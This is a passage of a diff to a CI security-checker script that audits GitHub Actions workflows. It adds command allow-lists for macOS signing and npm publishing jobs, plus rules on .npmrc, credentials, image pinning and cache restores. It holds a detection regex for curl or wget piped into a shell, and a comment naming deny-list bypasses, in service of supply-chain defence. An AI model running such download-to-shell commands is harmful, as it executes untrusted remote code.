@@ -60,7 +60,12 @@
 #      and (#820) by no other route: not gh run download, the artifacts REST
 #      API, the runtime artifact service (ACTIONS_RESULTS_URL and
 #      ACTIONS_RUNTIME_TOKEN) or any other action named for artifacts,
-#      downloads or the runtime.
+#      downloads or the runtime. (#870) A job on the release path that reads
+#      a secret other than GITHUB_TOKEN (the Apple signing secrets) is held
+#      the same way: it runs no Go, cgo, compiler, make, xcrun tool but
+#      notarytool and stapler, package manager, repository script or action
+#      but checkout and artifact transfer, and takes artifacts by digest
+#      (sha256sum, or shasum -a 256 on a macOS runner).
 #   7. (#687) "Authority" also counts any use of the `secrets` context other
 #      than secrets.GITHUB_TOKEN (including toJSON(secrets)), and `secrets:
 #      inherit`; and every rule that reads steps descends into local
@@ -87,6 +92,38 @@
 #      as listed, no write by redirection but to /dev/null, $GITHUB_OUTPUT
 #      or another descriptor, and the list is exactly what the jobs run. A
 #      job holding id-token with no list fails. See runAllow.
+#  10. (#1046) In a job holding id-token, npm version and a directory npm
+#      publish carry --ignore-scripts, never turned off again (lifecycle
+#      scripts run otherwise), npm version carries --workspaces=false, and no
+#      option comes before the npm command; publish-sidecar refuses, before
+#      it sets up or runs npm, a .npmrc anywhere in its checkout, a
+#      sidecar/npm that is not exactly the committed files (no link), and a
+#      package.json with a field beyond its list or another name; Prepare
+#      checks each package directory again where npm runs; both steps are
+#      executed against hostile fixtures, setup-node never restores the npm
+#      cache where authority is held, and the repository holds no .npmrc.
+#  11. (#1001) No checkout in any workflow, local composite actions included,
+#      leaves its token in .git/config: persist-credentials is false on every
+#      one, read-only workflows too, since their later steps run PR code.
+#  12. (#1047) A workflow that holds no authority and that no other workflow
+#      can call may restore from the Actions cache by its exact key only, in
+#      one form: a lookup-only actions/cache/restore, then actions/cache on
+#      the same key and path with no restore-keys that downloads only on that
+#      exact hit, then a bash step that removes every cached path (rm -rf, or
+#      go clean -modcache) unless its own hit is exact. So a prefix match is
+#      not extracted unless the exact entry is evicted or deleted between the
+#      first two steps. Nor may the env that reaches the discard, written in
+#      the YAML or to GITHUB_ENV/GITHUB_PATH by an earlier step, change what
+#      it runs (what actions write there is not read).
+#      Not stopped: an entry written at the exact key before CI wrote it.
+#      The toolchain caches of setup-bun, setup-go and setup-node take any
+#      prefix match of their key, so they stay refused in every workflow
+#      rule 5 reads.
+#  13. (#1048) Rule 5 reads every workflow rule 3 does: authority or reach.
+#      Every container:, services: and docker:// image in every workflow is
+#      pinned by digest. Not checked: the BuildKit layer cache docker-build
+#      reads with cache-from type=gha, whose index is the latest any run
+#      on main wrote, not an exact key.
 #
 # Each rule is also run against a mutated copy that breaks it, and must report
 # it, so a neutered check fails here instead of passing everything.
@@ -119,10 +156,15 @@ trap 'rm -rf "$WORK"' EXIT
 # check <rule> <file>: one violation per line, nothing when clean.
 #   rule = scoped | publish-perms | pinned | authority | reach | untrusted
 #          | mutable | narrow | pushcache | opens-pr | catalog-pr | npmpin
-#          | runs
+#          | runs | persist | images
 check() {
-	# shellcheck disable=SC2016 # JavaScript source, not shell: nothing should expand.
-	RULE="$1" FILE="$2" REPO="${REPO_DIR:-${HERE}/../..}" bun -e '
+	# Written to a file once and run from there, not handed to bun -e: the
+	# source outgrew the 128 KiB Linux allows a single argument
+	# (MAX_ARG_STRLEN; 131770 bytes in the #870 review, when execve refused
+	# it and every rule failed). printf is a builtin, so no exec limit applies.
+	if [ ! -s "${WORK}/check.mjs" ]; then
+		# shellcheck disable=SC2016 # JavaScript source, not shell: nothing should expand.
+		printf '%s' '
 const doc = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
 const jobs = doc.jobs ?? {};
 const out = [];
@@ -131,10 +173,12 @@ const rule = process.env.RULE;
 // recursively: a workflow that pins everything it names can otherwise reach
 // unpinned code one level down. In a composite step, ${{ inputs.X }} is
 // replaced by what the caller passes, or by the input default.
-const flatSteps = (steps, via = "", depth = 0) => {
+// penv: the env of the steps that use the enclosing local actions, which
+// GitHub hands down to the steps inside them (#1047 review 3).
+const flatSteps = (steps, via = "", depth = 0, penv = {}) => {
   const outSteps = [];
   for (const st of steps ?? []) {
-    outSteps.push({ st, via });
+    outSteps.push({ st, via, penv });
     const u = String(st.uses ?? "");
     if (!u.startsWith("./") || /\.ya?ml$/.test(u)) continue;
     // Every rule that reads steps would otherwise pass what it cannot see.
@@ -150,7 +194,7 @@ const flatSteps = (steps, via = "", depth = 0) => {
     for (const [k, v] of Object.entries(st.with ?? {})) inputs.set(k.toLowerCase(), v);
     const fill = (x) => JSON.parse(JSON.stringify(x).replace(/\$\{\{\s*inputs\.([A-Za-z0-9_-]+)\s*\}\}/g,
       (m, k) => inputs.has(k.toLowerCase()) ? JSON.stringify(String(inputs.get(k.toLowerCase()))).slice(1, -1) : m));
-    outSteps.push(...flatSteps(action.runs.steps.map(fill), via + u + " > ", depth + 1));
+    outSteps.push(...flatSteps(action.runs.steps.map(fill), via + u + " > ", depth + 1, { ...penv, ...(st.env ?? {}) }));
   }
   return outSteps;
 };
@@ -358,6 +402,11 @@ const shRead = (src) => {
   return { cmds, funcs, arrays, fors, unread };
 };
 if (rule === "runs") {
+  // #870 review: and so are those of the two macOS signers, which hold the
+  // long-lived Apple signing secrets (sign-sidecar-darwin, sign-macos). A
+  // job that reads them has to have a list here, like one holding id-token,
+  // and may also write by redirection to the files named in its writes.
+  //
   // #1029: the commands the two npm publishing jobs run are listed, not the
   // ones they must not run, and (security review of #1029) so are those of
   // every other job holding id-token: today the two Windows signers, which
@@ -410,9 +459,11 @@ if (rule === "runs") {
   // inputs, which the scripts check before use, #684, #781) and from the
   // runner reach the listed forms as they come; a redirection to
   // "$GITHUB_OUTPUT" is matched as that text, which holds because narrow
-  // refuses any GITHUB_* name being set; and npm runs lifecycle scripts of
-  // the package.json in a directory it publishes or versions
-  // (publish-sidecar), which is repository content, not run: text.
+  // refuses any GITHUB_* name being set. npm would run the lifecycle scripts
+  // of the package.json in a directory it publishes or versions
+  // (publish-sidecar), which is repository content, not run: text: narrow
+  // requires --ignore-scripts on those calls, and publish-sidecar refuses a
+  // .npmrc or a package.json field beyond its list before npm runs (#1046).
   const runAllow = {
     "publish-brain": {
       free: ["[", "base64", "echo", "exit", "sha256sum"],
@@ -449,7 +500,7 @@ if (rule === "runs") {
       ],
     },
     "publish-sidecar": {
-      free: ["[", "base64", "cut", "echo", "exit", "grep", "mkdir", "printf", "return", "sha256sum", "true"],
+      free: ["[", "base64", "cut", "echo", "exit", "grep", "mkdir", "printf", "return", "sha256sum", "tr", "true"],
       pinned: {
         cd: [
           "cd \"$GITHUB_WORKSPACE\"",
@@ -479,11 +530,20 @@ if (rule === "runs") {
         find: [
           "find \"${tmp}/x\" -mindepth 1 -maxdepth 1 -printf \x27%P %y\\n\x27",
           "find . -mindepth 1 -not -type d",
+          "find . -name .npmrc -print -quit",
+          "find \"${pkg_dir}\" -mindepth 1 -maxdepth 1 -printf \x27%y %f\\n\x27",
+          "find sidecar/npm -mindepth 1 -printf \x27%y %P\\n\x27",
           "find . -mindepth 1 -not -type d -not -type f -print -quit",
           "find . -mindepth 1 -not -type d -printf \x27%y %P\\n\x27",
           "find . -name \x27*[![:print:]]*\x27 -print -quit",
           "find . -type f -print0",
           "find bin -type f -print -quit",
+        ],
+        jq: [
+          "jq -e \x27type == \"object\" and (keys - [\"bin\", \"description\", \"files\", \"name\", \"optionalDependencies\", \"repository\", \"version\"] == []) and .name == \"@usejarvis/sidecar\" and .files == [\"bin\"] and .bin == {\"jarvis\": \"bin/jarvis\"} and (.optionalDependencies | type == \"object\" and keys == [\"@usejarvis/sidecar-darwin-arm64\", \"@usejarvis/sidecar-darwin-x64\", \"@usejarvis/sidecar-linux-arm64\", \"@usejarvis/sidecar-linux-x64\", \"@usejarvis/sidecar-win32-x64\"] and all(.[]; type == \"string\" and test(\"\\\\A[0-9]+\\\\.[0-9]+\\\\.[0-9]+\\\\z\")))\x27 sidecar/npm/jarvis-sidecar/package.json",
+          "jq -e --arg v \"$VERSION\" \x27[.optionalDependencies[]] | length == 5 and all(. == $v)\x27 package.json",
+          "jq -e --arg name \"@usejarvis/sidecar-${platform}\" \x27type == \"object\" and (keys - [\"cpu\", \"description\", \"files\", \"name\", \"os\", \"repository\", \"version\"] == []) and .name == $name and .files == [\"bin\"]\x27 \"${pkg_dir}/package.json\"",
+          "jq -e --arg name \"@usejarvis/sidecar-${platform}\" \x27type == \"object\" and (keys - [\"cpu\", \"description\", \"files\", \"name\", \"os\", \"repository\", \"version\"] == []) and .name == $name and .files == [\"bin\"]\x27 \"sidecar/npm/${platform}/package.json\"",
         ],
         local: [
           "local url integrity tmp got names types ours theirs",
@@ -496,8 +556,8 @@ if (rule === "runs") {
         npm: [
           "npm --version",
           "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
-          "npm publish --access public \"${flags[@]}\"",
-          "npm version \"${VERSION}\" --no-git-tag-version --allow-same-version",
+          "npm publish --access public --ignore-scripts \"${flags[@]}\"",
+          "npm version \"${VERSION}\" --no-git-tag-version --allow-same-version --ignore-scripts --workspaces=false",
           "npm view \"${1}@${VERSION}\" dist.integrity",
           "npm view \"${1}@${VERSION}\" dist.tarball",
           "npm view \"${pkg}@${VERSION}\" version",
@@ -574,6 +634,7 @@ if (rule === "runs") {
         "same=0",
         "sums=\"$(cd artifacts && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | base64 -w0)\"",
         "theirs=\"$(manifest \"${tmp}/x/package\")\"",
+        "tree=\"$(find sidecar/npm -mindepth 1 -printf \x27%y %P\\n\x27 | LC_ALL=C sort | tr \x27\\n\x27 \x27 \x27)\"",
         "tmp=\"$(mktemp -d)\"",
         "types=\"$(tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\" | cut -c1)\"",
         "url=\"$(npm view \"${1}@${VERSION}\" dist.tarball)\"",
@@ -640,6 +701,228 @@ if (rule === "runs") {
         "missing=\"Windows signing is not configured (GCP_KMS_KEYRING unset)\"",
       ],
     },
+    "sign-sidecar-darwin": {
+      free: ["[", "echo", "exit", "mkdir", "printf", "read", "test", "true", "umask"],
+      pinned: {
+        "/usr/bin/tar": [
+          "/usr/bin/tar --no-mac-metadata -C \"${RUNNER_TEMP}/work/${leg}\" -czf \"${RUNNER_TEMP}/out/${leg}/jarvis-app.tar.gz\" Jarvis.app",
+          "/usr/bin/tar -tvzf \"$tgz\"",
+          "/usr/bin/tar -tzf \"$tgz\"",
+          "/usr/bin/tar -xzf \"$tgz\" -C \"$dest\"",
+        ],
+        awk: [
+          "awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27",
+        ],
+        base64: [
+          "base64 -d",
+        ],
+        codesign: [
+          "codesign --force --options runtime --timestamp --entitlements packaging/macos/entitlements.plist --sign \"$IDENTITY\" \"$app\"",
+          "codesign --force --options runtime --timestamp --sign \"$IDENTITY\" \"${app}/Contents/MacOS/ocr-helper\"",
+          "codesign --verify --strict --verbose=2 \"$app\"",
+        ],
+        ditto: [
+          "ditto -c -k --keepParent \"$app\" \"$zip\"",
+        ],
+        export: [
+          "export COPYFILE_DISABLE=1",
+          "export LC_ALL=C",
+        ],
+        find: [
+          "find \"$dest\" -mindepth 1 -maxdepth 1 -print",
+          "find \"$dest\" -mindepth 1 -not -type d -not -type f -print",
+          "find \"$dest\" -type f -links +1 -print",
+          "find \"$in\" -mindepth 1 -not -type d -not -type f -print",
+          "find \"$in\" -mindepth 1 -print",
+        ],
+        jq: [
+          "jq -r \x27.id // empty\x27",
+          "jq -r \x27.status // empty\x27",
+        ],
+        openssl: [
+          "openssl rand -hex 24",
+        ],
+        rm: [
+          "rm -f \"$cert\"",
+        ],
+        security: [
+          "security create-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
+          "security find-identity -v -p codesigning \"$kc\"",
+          "security import \"$cert\" -k \"$kc\" -P \"$APPLE_CERT_PASSWORD\" -T /usr/bin/codesign",
+          "security list-keychains -d user -s \"$kc\" login.keychain",
+          "security set-key-partition-list -S apple-tool:,apple: -s -k \"$KEYCHAIN_PASSWORD\" \"$kc\"",
+          "security set-keychain-settings -lut 3600 \"$kc\"",
+          "security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+        shasum: [
+          "shasum -a 256 \"${RUNNER_TEMP}/out/${leg}/jarvis-app.tar.gz\"",
+          "shasum -a 256 -c -",
+        ],
+        sort: [
+          "sort",
+        ],
+        spctl: [
+          "spctl --assess --type execute -vv \"$app\"",
+        ],
+        trap: [
+          "trap \x27rm -f \"$cert\" \"$key\"; security list-keychains -d user -s login.keychain || true; security delete-keychain \"$kc\" || true\x27 EXIT",
+        ],
+        unset: [
+          "unset APPLE_CERT_P12 APPLE_CERT_PASSWORD ASC_API_KEY_P8",
+        ],
+        xcrun: [
+          "xcrun notarytool log \"$SUBMISSION_ID\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\"",
+          "xcrun notarytool submit \"$zip\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" --wait --timeout 30m --output-format json",
+          "xcrun stapler staple \"$app\"",
+        ],
+      },
+      funcs: [],
+      arrays: [],
+      fors: ["leg in darwin-arm64 darwin-x64"],
+      calls: [],
+      assigns: [
+        "absent=\"\"",
+        "absent=\"${absent:+${absent}, }APPLE_CERT_P12\"",
+        "absent=\"${absent:+${absent}, }APPLE_CERT_PASSWORD\"",
+        "absent=\"${absent:+${absent}, }ASC_KEY_ID\"",
+        "absent=\"${absent:+${absent}, }ASC_ISSUER_ID\"",
+        "absent=\"${absent:+${absent}, }ASC_API_KEY_P8\"",
+        "IDENTITY=\"$(security find-identity -v -p codesigning \"$kc\" | awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27)\"",
+        "KEYCHAIN_PASSWORD=\"$(openssl rand -hex 24)\"",
+        "NOTARY_STATUS=\"$(echo \"$SUBMIT_JSON\" | jq -r \x27.status // empty\x27)\"",
+        "SUBMISSION_ID=\"$(echo \"$SUBMIT_JSON\" | jq -r \x27.id // empty\x27)\"",
+        "SUBMIT_JSON=\"$(xcrun notarytool submit \"$zip\" \\\n    --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" \\\n    --wait --timeout 30m --output-format json)\"",
+        "app=\"${RUNNER_TEMP}/work/${leg}/Jarvis.app\"",
+        "cert=\"${RUNNER_TEMP}/cert.p12\"",
+        "dest=\"${RUNNER_TEMP}/work/${leg}\"",
+        "in=\"${RUNNER_TEMP}/unsigned\"",
+        "kc=\"${RUNNER_TEMP}/sign.keychain-db\"",
+        "key=\"${RUNNER_TEMP}/asc_key.p8\"",
+        "names=\"$(/usr/bin/tar -tzf \"$tgz\")\"",
+        "sum=\"$(shasum -a 256 \"${RUNNER_TEMP}/out/${leg}/jarvis-app.tar.gz\")\"",
+        "sum=\"${sum%% *}\"",
+        "tgz=\"${RUNNER_TEMP}/unsigned/${leg}/jarvis-app.tar.gz\"",
+        "want=\"$(printf \x27%s\\n\x27 \"${in}/darwin-arm64\" \"${in}/darwin-arm64/jarvis-app.tar.gz\" \"${in}/darwin-x64\" \"${in}/darwin-x64/jarvis-app.tar.gz\")\"",
+        "zip=\"${RUNNER_TEMP}/Jarvis-${leg}.zip\"",
+      ],
+      writes: ["\"$cert\"", "\"$key\""],
+    },
+    "sign-macos": {
+      free: ["[", "echo", "exit", "mkdir", "printf", "read", "test", "true", "umask"],
+      pinned: {
+        "/usr/bin/tar": [
+          "/usr/bin/tar -tvzf \"$tgz\"",
+          "/usr/bin/tar -tzf \"$tgz\"",
+          "/usr/bin/tar -xzf \"$tgz\" -C \"$dest\"",
+        ],
+        awk: [
+          "awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27",
+        ],
+        base64: [
+          "base64 -d",
+        ],
+        codesign: [
+          "codesign --force --options runtime --timestamp --sign \"$IDENTITY\" \"$APP\"",
+          "codesign --force --timestamp --sign \"$IDENTITY\" \"$DMG\"",
+          "codesign --verify --strict --verbose=2 \"$APP\"",
+        ],
+        ditto: [
+          "ditto -c -k --keepParent \"$APP\" \"${RUNNER_TEMP}/InstallJarvis.zip\"",
+        ],
+        export: [
+          "export LC_ALL=C",
+        ],
+        find: [
+          "find \"$dest\" -mindepth 1 -maxdepth 1 -print",
+          "find \"$dest\" -mindepth 1 -not -type d -not -type f -print",
+          "find \"$dest\" -type f -links +1 -print",
+          "find \"$in\" -mindepth 1 -print",
+        ],
+        hdiutil: [
+          "hdiutil create -volname \"Install Jarvis\" -srcfolder \"$APP\" -format UDZO -ov \"$DMG\"",
+          "hdiutil create -volname \"Install Jarvis\" -srcfolder \"${RUNNER_TEMP}/work/Install Jarvis.app\" -format UDZO -ov \"${RUNNER_TEMP}/out/Install-Jarvis.dmg\"",
+        ],
+        jq: [
+          "jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-app.json\"",
+          "jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-dmg.json\"",
+          "jq -r \x27.status // empty\x27 \"${RUNNER_TEMP}/notary-app.json\"",
+          "jq -r \x27.status // empty\x27 \"${RUNNER_TEMP}/notary-dmg.json\"",
+        ],
+        openssl: [
+          "openssl rand -hex 24",
+        ],
+        rm: [
+          "rm -f \"$cert\"",
+        ],
+        security: [
+          "security create-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
+          "security find-identity -v -p codesigning \"$kc\"",
+          "security import \"$cert\" -k \"$kc\" -P \"$APPLE_CERT_PASSWORD\" -T /usr/bin/codesign",
+          "security list-keychains -d user -s \"$kc\" login.keychain",
+          "security set-key-partition-list -S apple-tool:,apple: -s -k \"$KEYCHAIN_PASSWORD\" \"$kc\"",
+          "security set-keychain-settings -lut 3600 \"$kc\"",
+          "security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" \"$kc\"",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+        shasum: [
+          "shasum -a 256 \"${RUNNER_TEMP}/out/Install-Jarvis.dmg\"",
+          "shasum -a 256 -c -",
+        ],
+        spctl: [
+          "spctl --assess --type open --context context:primary-signature -vv \"$DMG\"",
+        ],
+        tee: [
+          "tee \"${RUNNER_TEMP}/notary-app.json\"",
+          "tee \"${RUNNER_TEMP}/notary-dmg.json\"",
+        ],
+        trap: [
+          "trap \x27rm -f \"$cert\" \"$key\"; security list-keychains -d user -s login.keychain || true; security delete-keychain \"$kc\" || true\x27 EXIT",
+        ],
+        unset: [
+          "unset APPLE_CERT_P12 APPLE_CERT_PASSWORD ASC_API_KEY_P8",
+        ],
+        xcrun: [
+          "xcrun notarytool log \"$APP_ID\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\"",
+          "xcrun notarytool log \"$DMG_ID\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\"",
+          "xcrun notarytool submit \"$DMG\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" --wait --timeout 30m --output-format json",
+          "xcrun notarytool submit \"${RUNNER_TEMP}/InstallJarvis.zip\" --key \"$key\" --key-id \"$ASC_KEY_ID\" --issuer \"$ASC_ISSUER_ID\" --wait --timeout 30m --output-format json",
+          "xcrun stapler staple \"$APP\"",
+          "xcrun stapler staple \"$DMG\"",
+        ],
+      },
+      funcs: [],
+      arrays: [],
+      fors: [],
+      calls: [],
+      assigns: [
+        "absent=\"\"",
+        "absent=\"${absent:+${absent}, }APPLE_CERT_P12\"",
+        "absent=\"${absent:+${absent}, }APPLE_CERT_PASSWORD\"",
+        "absent=\"${absent:+${absent}, }ASC_KEY_ID\"",
+        "absent=\"${absent:+${absent}, }ASC_ISSUER_ID\"",
+        "absent=\"${absent:+${absent}, }ASC_API_KEY_P8\"",
+        "APP=\"${RUNNER_TEMP}/work/Install Jarvis.app\"",
+        "APP_ID=\"$(jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-app.json\")\"",
+        "DMG=\"${RUNNER_TEMP}/out/Install-Jarvis.dmg\"",
+        "DMG_ID=\"$(jq -r \x27.id // empty\x27 \"${RUNNER_TEMP}/notary-dmg.json\")\"",
+        "IDENTITY=\"$(security find-identity -v -p codesigning \"$kc\" | awk -F\x27\"\x27 \x27/Developer ID Application/ {print $2; exit}\x27)\"",
+        "KEYCHAIN_PASSWORD=\"$(openssl rand -hex 24)\"",
+        "cert=\"${RUNNER_TEMP}/cert.p12\"",
+        "dest=\"${RUNNER_TEMP}/work\"",
+        "in=\"${RUNNER_TEMP}/unsigned\"",
+        "kc=\"${RUNNER_TEMP}/sign.keychain-db\"",
+        "key=\"${RUNNER_TEMP}/asc_key.p8\"",
+        "names=\"$(/usr/bin/tar -tzf \"$tgz\")\"",
+        "sum=\"$(shasum -a 256 \"${RUNNER_TEMP}/out/Install-Jarvis.dmg\")\"",
+        "tgz=\"${RUNNER_TEMP}/unsigned/install-jarvis-app.tar.gz\"",
+      ],
+      writes: ["\"$cert\"", "\"$key\""],
+    },
   };
   const writesOidc = (perm) => perm === "write-all" || (perm && typeof perm === "object" && perm["id-token"] === "write");
   const outOps = new Set([">", ">>", ">|", "&>", "&>>", "<>"]);
@@ -651,15 +934,22 @@ if (rule === "runs") {
     // Every job holding id-token has a list, whatever it runs: one that
     // only had to when it ran npm publish let an added job, or a signer,
     // download and run anything (security review of #1029).
+    // #870 review: a job that reads the Apple or App Store Connect secrets
+    // is held to a list too. narrow refuses toolchains by name, and a deny
+    // list is never complete (bash x, osascript x, arch -arm64 x, env -S x
+    // all passed it), so here every command it runs is listed instead.
+    const appleSecrets = /\bsecrets\s*(?:\.\s*|\[\s*\\?[\x27"])(?:APPLE_|ASC_)/i.test(JSON.stringify({ env: doc.env, job }));
     if (!allow) {
       if (writesOidc(job.permissions ?? doc.permissions))
         out.push(name + ": holds id-token and has no list of the commands it may run (#1029): add one to runAllow");
+      if (appleSecrets)
+        out.push(name + ": reads the Apple signing secrets and has no list of the commands it may run (#870): add one to runAllow");
       continue;
     }
     if (process.env.RUNS_REPORT) out.push("checked " + name);
     const listed = new Set([...allow.free, ...Object.keys(allow.pinned)]);
     for (const f of allow.funcs) if (listed.has(f)) out.push(name + ": runAllow lists " + f + " as a function and as a command");
-    const used = { free: new Set(), forms: new Set(), funcs: new Set(), arrays: new Set(), fors: new Set(), calls: new Set(), assigns: new Set() };
+    const used = { free: new Set(), forms: new Set(), funcs: new Set(), arrays: new Set(), fors: new Set(), calls: new Set(), assigns: new Set(), writes: new Set() };
     const plainShell = ["bash", "bash -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
     for (const [i, { st, via }] of steps.entries()) {
       if (typeof st.run !== "string") continue;
@@ -686,7 +976,8 @@ if (rule === "runs") {
       }
       for (const c of r.cmds) {
         for (const rd of c.redirs)
-          if ((outOps.has(rd.op) && rd.target !== "/dev/null" && rd.target !== "\"$GITHUB_OUTPUT\"") ||
+          if (outOps.has(rd.op) && (allow.writes ?? []).includes(rd.target)) used.writes.add(rd.target);
+          else if ((outOps.has(rd.op) && rd.target !== "/dev/null" && rd.target !== "\"$GITHUB_OUTPUT\"") ||
               ((rd.op === ">&" || rd.op === "<&") && !/^(?:[0-9]+|-)$/.test(rd.target)))
             out.push(label + " writes to " + rd.target + " (only /dev/null, $GITHUB_OUTPUT or another descriptor) (#1029)");
         if (c.name === null) {
@@ -697,7 +988,8 @@ if (rule === "runs") {
           }
           continue;
         }
-        for (const a of c.assigns) if (a !== "LC_ALL=C") out.push(label + " runs " + c.name + " with " + a + " in front, where only LC_ALL=C may go (#1029)");
+        // IFS= in front of read changes only how that read splits its line.
+        for (const a of c.assigns) if (a !== "LC_ALL=C" && !(a === "IFS=" && c.name === "read")) out.push(label + " runs " + c.name + " with " + a + " in front, where only LC_ALL=C may go (#1029)");
         if (!Object.hasOwn(allow.pinned, c.name) && !/^(?:[A-Za-z_][A-Za-z0-9_.-]*|\[)$/.test(c.name)) {
           out.push(label + " runs " + c.name + ", which is not a plain command name this rule can check (a path or an expansion) (#1029)");
           continue;
@@ -727,6 +1019,7 @@ if (rule === "runs") {
     for (const x of allow.fors) if (!used.fors.has(x)) stale("for list", x);
     for (const x of allow.calls) if (!used.calls.has(x)) stale("call", x);
     for (const x of allow.assigns) if (!used.assigns.has(x)) stale("assignment", x);
+    for (const x of allow.writes ?? []) if (!used.writes.has(x)) stale("write target", x);
   }
 }
 if (rule === "scoped" && doc.permissions === undefined)
@@ -740,8 +1033,10 @@ if (rule === "publish-perms") {
   for (const [name, job] of Object.entries(jobs))
     if (job.permissions === undefined) out.push(name + ": declares no permissions of its own");
 }
-if (rule === "authority") {
-  // Prints "yes" when the workflow holds authority (see header), else nothing.
+// Whether the workflow holds authority (see header). The authority rule
+// prints it; mutable reads it too, to hold the cache restores of a workflow
+// that holds none to the exact-key form instead of refusing them (#1047).
+const holdsAuthority = () => {
   const grants = (perm) => perm === "write-all" ||
     (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
   const on = doc.on ?? doc[true] ?? {};
@@ -756,10 +1051,10 @@ if (rule === "authority") {
   // hold braces (format strings), so read up to the closing }} lazily.
   const exprs = [...JSON.stringify({ env: doc.env, jobs }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1]);
   const secret = exprs.some((e) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(e));
-  if (grants(doc.permissions) || Object.values(jobs).some((j) => grants(j.permissions)) ||
-      triggers.includes("pull_request_target") || secret || Object.values(jobs).some((j) => j.secrets === "inherit"))
-    out.push("yes");
-}
+  return Boolean(grants(doc.permissions) || Object.values(jobs).some((j) => grants(j.permissions)) ||
+      triggers.includes("pull_request_target") || secret || Object.values(jobs).some((j) => j.secrets === "inherit"));
+};
+if (rule === "authority" && holdsAuthority()) out.push("yes");
 if (rule === "reach") {
   // Prints "yes" when a push or a pull request can start the workflow (#984).
   // The triggers that cannot are listed, not the ones that can: an event
@@ -840,7 +1135,7 @@ if (rule === "untrusted") {
     "\\s+(?:install|i|add|update|dlx|exec)|yarn|bunx|npx)\\b");
   const bunInstall = new RegExp("\\bbun" + flags + "\\s+(?:install|i)\\b");
   const frozen = /--frozen-lockfile(?![=\w-])/;
-  const thirdParty = /\bscripts\/(sync-pieces-catalog|inspect-verified-pieces)\.ts\b/;
+  const thirdParty = /\bscripts\/(sync-pieces-catalog|inspect-verified-pieces|check-piece-licenses)\.ts\b/;
   // #983: a Go build, vet or test compiles and runs module code (the webview
   // bump links fresh upstream code into the sidecar tests), and a script of
   // this repository (scripts/vendor-webview.sh fetches that upstream code)
@@ -964,11 +1259,15 @@ if (rule === "mutable") {
   });
   for (const [k, v] of Object.entries(doc.env ?? {}))
     if (/version$/i.test(k) && floating(v)) out.push("env." + k + " is " + JSON.stringify(v));
+  const authority = holdsAuthority();
+  const on = doc.on ?? doc[true] ?? {};
+  const callable = (typeof on === "string" ? [on] : Array.isArray(on) ? on : Object.keys(on)).includes("workflow_call");
   for (const [name, job] of Object.entries(jobs)) {
     for (const [k, v] of Object.entries(job.env ?? {}))
       if (/version$/i.test(k) && floating(resolve(v, doc.env)))
         out.push(name + ": env." + k + " is " + JSON.stringify(v));
-    for (const [i, { st: s, via }] of flatSteps(job.steps).entries()) {
+    const flat = flatSteps(job.steps);
+    for (const [i, { st: s, via }] of flat.entries()) {
       const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (s.name ?? s.id ?? s.uses ?? String(i));
       const scopes = [s.env, job.env, doc.env];
       for (const [k, v] of Object.entries(s.env ?? {}))
@@ -1021,13 +1320,111 @@ if (rule === "mutable") {
           if (/\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(line))
             out.push(label + ": pipes a download into a shell: " + raw.trim());
         }
-      const uses = String(s.uses ?? "");
+      // Owner and repository names are case-insensitive to GitHub (#1048).
+      const uses = String(s.uses ?? "").toLowerCase();
       // A pinned version is only what is requested: these actions restore
       // the bytes from the Actions cache, which any run on main can write.
       if (uses.startsWith("oven-sh/setup-bun@") && String(s.with?.["no-cache"]) !== "true")
         out.push(label + ": setup-bun without no-cache: true restores Bun from the Actions cache");
-      if (/^actions\/cache(\/restore)?@/.test(uses))
-        out.push(label + ": restores from the Actions cache (writable by any run on main)");
+      // (#1047) A workflow that holds no authority may restore from the
+      // Actions cache by its exact key only, in one form, three steps in a
+      // row: actions/cache/restore with lookup-only true (downloads nothing,
+      // reports cache-hit true only for the exact key); actions/cache with
+      // the same key and path and lookup-only exactly "not that exact hit",
+      // so a prefix match (the cache service matches the key itself as a
+      // prefix too) is not extracted, tar -P and all, unless the exact entry
+      // is evicted or deleted between the two steps; and a discard of every cached path unless
+      // its own hit is exact. Both cache steps take only path, key and
+      // lookup-only, read case-insensitively as GitHub does. The discard is
+      // read line by line: rm -rf of a literal path or of "$K" from its env,
+      // or go clean -modcache with GOMODCACHE in its env, and nothing else;
+      // its env holds exactly those names, none starting with ~, and neither
+      // the job nor the workflow sets a name that changes what it runs. A
+      // workflow_call callee counts as holding authority here: with no
+      // permissions of its own it runs with its caller token. Not stopped: an
+      // entry written at the exact key before CI wrote it. The toolchain
+      // actions above restore through their own key and take any prefix
+      // match, with no switch to refuse it, so they stay refused everywhere.
+      if (/^actions\/cache(\/restore)?@/.test(uses)) {
+        const one = (x) => String(x ?? "").replace(/\s+/g, " ").trim();
+        const hitIs = (id) => "steps." + id + ".outputs.cache-hit != \x27true\x27";
